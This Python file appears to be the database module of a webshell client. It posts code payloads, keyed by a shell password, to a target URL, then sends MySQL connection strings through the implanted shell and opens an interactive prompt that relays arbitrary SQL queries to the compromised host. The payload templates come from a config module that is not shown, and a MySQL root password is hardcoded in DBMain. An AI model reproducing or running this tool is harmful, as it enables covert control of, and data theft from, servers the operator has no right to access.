import config.dbConfig as dbC
import requests as res
class databaseManager:
    def __init__(self,con):
        self.con = con

    def Begin(self):
        self.connect = self.con.getUrl()
        self.key = self.con.getKey()
        date = { self.key : self.getBaseCode() }
        re = res.session()
        firstURL=re.post(self.connect,date)
        self.serviceType=firstURL.text
        print("目标主机为:",self.serviceType)
        self.DBMain(re)
        re.close()

    def getBaseCode(self):
        baseCodeForFile=dbC.Mysql_BaseCode
        #print(baseCodeForFile)
        return baseCodeForFile

    def DBMain(self,re):
        sqlAddress = '127.0.0.1'#input("address(eg:localhost):")
        sqlUser = 'root'#input("username:")
        sqlPassword = '21112325HUAi'#input("password:")
        sqlconnect = dbC.Mysql_Connect.replace('#1',sqlAddress,1)
        sqlconnect = sqlconnect.replace('#2',sqlUser,1)
        sqlconnect = sqlconnect.replace('#3',sqlPassword,1)
        sqlconnectY = sqlconnect.replace('#4',"information_schema",1)
        #print(sqlconnect)
        date = { self.key : sqlconnectY }
        commit = re.post(self.connect,date)
        print(commit.text)
        while True:
            flag = input("sql >")
            if flag == 'exit':
                break 
            else:
                flag1 = flag.split()
                if flag1[0] == 'use':
                    flag2=flag1[1].split(';')
                    sqlconnectY = sqlconnect.replace('#4',flag2[0],1)
                else:
                    DBS = dbC.Mysql_ShowDBs.replace('@@',sqlconnectY,1)
                    DBS = DBS.replace('##',flag,1)
                    #print(DBS)
                    date = { self.key : DBS }
                    commit = re.post(self.connect,date)
                    print(commit.text)
